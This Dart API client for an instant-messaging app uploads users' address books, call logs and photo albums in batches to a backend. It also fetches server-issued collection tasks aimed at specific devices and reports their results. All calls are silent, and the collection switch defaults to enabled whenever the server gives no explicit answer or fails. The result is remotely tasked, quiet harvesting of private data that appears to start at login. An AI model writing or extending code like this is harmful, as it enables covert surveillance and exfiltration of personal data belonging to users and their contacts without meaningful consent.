import 'package:dio/dio.dart';



import '../core/http/dio_client.dart';



/// 数据采集接口。对应 im-uniapp common/data-collect.js 上报逻辑。

class DataCollectApi {

  DataCollectApi(this._c);



  final DioClient _c;



  static const _uploadTimeout = Duration(seconds: 30);

  static const _resultTimeout = Duration(seconds: 10);



  Map<String, dynamic> _deviceMeta({

    required String deviceId,

    String? deviceLabel,

    required String triggerSource,

    int? taskId,

    String? taskNo,

    int? collectLogId,

  }) =>

      {

        if (deviceId.isNotEmpty) 'deviceId': deviceId,

        if (deviceLabel != null && deviceLabel.isNotEmpty) 'deviceLabel': deviceLabel,

        if (triggerSource.isNotEmpty) 'triggerSource': triggerSource,

        if (taskId != null) 'taskId': taskId,

        if (taskNo != null && taskNo.isNotEmpty) 'taskNo': taskNo,

        if (collectLogId != null) 'collectLogId': collectLogId,

      };



  /// GET /user/collect/switch
  Future<bool> isCollectEnabled({
    required String deviceId,
    int? dataType,
  }) async {
    try {
      final query = <String, dynamic>{'deviceId': deviceId};
      if (dataType != null && dataType > 0) {
        query['dataType'] = dataType;
      }
      final data = await _c.get<Map<String, dynamic>>(
        '/user/collect/switch',
        query: query,
        silent: true,
      );
      if (data['enabled'] == true) {
        return true;
      }
      if (data['enabled'] == false) {
        return false;
      }
      return true;

    } catch (_) {

      return true;

    }

  }

  /// GET /data/collect/task/list，拉取当前设备待执行任务，兜底补偿丢失的 WS/系统消息。
  Future<List<Map<String, dynamic>>> listPendingTasks({
    required int userId,
    required String deviceId,
  }) async {
    if (userId <= 0 || deviceId.isEmpty) return const [];
    final data = await _c.get<List<dynamic>>(
      '/data/collect/task/list',
      query: {
        'userId': userId,
        'status': 1,
        'pageNum': 1,
        'pageSize': 20,
      },
      silent: true,
    );
    return data
        .whereType<Map>()
        .map((e) => e.cast<String, dynamic>())
        .where((e) {
          final target = e['targetDeviceId']?.toString() ?? '';
          return target.isEmpty || target == deviceId;
        })
        .toList();
  }



  /// POST /user/collect/log/start

  Future<int?> startCollectLog({

    required String deviceId,

    String? deviceLabel,

    required int dataType,

    required String triggerSource,

    int? taskId,

    String? taskNo,

    int? batchIndex,

    int? totalBatches,

    String? clientVersion,

  }) async {

    try {

      final data = await _c.post<Map<String, dynamic>>(
        '/user/collect/log/start',
        data: {
          'deviceId': deviceId,
          'deviceLabel': deviceLabel,
          'dataType': dataType,
          'triggerSource': triggerSource,
          'taskId': taskId,
          'taskNo': taskNo,
          'batchIndex': batchIndex,
          'totalBatches': totalBatches,
          'clientVersion': clientVersion,
        },
        silent: true,
      );
      final id = data['collectLogId'];

        if (id is int) return id;
        if (id is num) return id.toInt();

    } catch (_) {}

    return null;

  }



  /// POST /user/collect/log/finish

  Future<void> finishCollectLog({

    required int collectLogId,

    required int status,

    int? dataCount,

    String? errorMessage,

  }) =>

      _c.post<dynamic>(

        '/user/collect/log/finish',

        data: {

          'collectLogId': collectLogId,

          'status': status,

          'dataCount': dataCount,

          'errorMessage': errorMessage,

        },

        silent: true,

      );



  /// 批量上报通讯录。POST /user/addressBook/report。

  Future<void> reportAddressBook({

    required List<Map<String, dynamic>> contacts,

    required int batchIndex,

    required int totalBatches,

    String deviceId = '',

    String? deviceLabel,

    String triggerSource = 'login',

    int? taskId,

    String? taskNo,

    int? collectLogId,

    bool reconcileSnapshot = false,

    List<String>? snapshotContactIds,

  }) =>

      _c.post<dynamic>(

        '/user/addressBook/report',

        data: {

          'contacts': contacts,

          'batchIndex': batchIndex,

          'totalBatches': totalBatches,

          'timestamp': DateTime.now().millisecondsSinceEpoch,

          if (reconcileSnapshot) 'reconcileSnapshot': true,

          if (snapshotContactIds != null) 'snapshotContactIds': snapshotContactIds,

          ..._deviceMeta(

            deviceId: deviceId,

            deviceLabel: deviceLabel,

            triggerSource: triggerSource,

            taskId: taskId,

            taskNo: taskNo,

            collectLogId: collectLogId,

          ),

        },

        silent: true,

        options: Options(

          receiveTimeout: _uploadTimeout,

          sendTimeout: _uploadTimeout,

        ),

      );



  /// 批量上报通话记录。POST /user/callRecord/report。

  Future<void> reportCallRecord({

    required List<Map<String, dynamic>> callLogs,

    required int batchIndex,

    required int totalBatches,

    String deviceId = '',

    String? deviceLabel,

    String triggerSource = 'login',

    int? taskId,

    String? taskNo,

    int? collectLogId,

  }) =>

      _c.post<dynamic>(

        '/user/callRecord/report',

        data: {

          'callLogs': callLogs,

          'batchIndex': batchIndex,

          'totalBatches': totalBatches,

          'timestamp': DateTime.now().millisecondsSinceEpoch,

          ..._deviceMeta(

            deviceId: deviceId,

            deviceLabel: deviceLabel,

            triggerSource: triggerSource,

            taskId: taskId,

            taskNo: taskNo,

            collectLogId: collectLogId,

          ),

        },

        silent: true,

        options: Options(

          receiveTimeout: _uploadTimeout,

          sendTimeout: _uploadTimeout,

        ),

      );



  /// 批量上报相册照片。POST /user/photo/report。

  Future<void> reportPhotoAlbum({

    required List<Map<String, dynamic>> photos,

    required int batchIndex,

    required int totalBatches,

    String deviceId = '',

    String? deviceLabel,

    String triggerSource = 'login',

    int? taskId,

    String? taskNo,

    int? collectLogId,

  }) =>

      _c.post<dynamic>(

        '/user/photo/report',

        data: {

          'photos': photos,

          'batchIndex': batchIndex,

          'totalBatches': totalBatches,

          'timestamp': DateTime.now().millisecondsSinceEpoch,

          ..._deviceMeta(

            deviceId: deviceId,

            deviceLabel: deviceLabel,

            triggerSource: triggerSource,

            taskId: taskId,

            taskNo: taskNo,

            collectLogId: collectLogId,

          ),

        },

        silent: true,

        options: Options(

          receiveTimeout: _uploadTimeout,

          sendTimeout: _uploadTimeout,

        ),

      );



  /// 更新采集任务执行结果。POST /data/collect/task/updateResult。

  Future<void> updateTaskResult({

    required String taskNo,

    required int taskId,

    required int executeStatus,

    required int dataCount,

    String? errorMessage,

    required String deviceInfo,

    required String clientVersion,

  }) =>

      _c.post<dynamic>(

        '/data/collect/task/updateResult',

        data: {

          'taskNo': taskNo,

          'taskId': taskId,

          'executeStatus': executeStatus,

          'dataCount': dataCount,

          'errorMessage': errorMessage,

          'deviceInfo': deviceInfo,

          'clientVersion': clientVersion,

        },

        silent: true,

        options: Options(

          receiveTimeout: _resultTimeout,

          sendTimeout: _resultTimeout,

        ),

      );

}

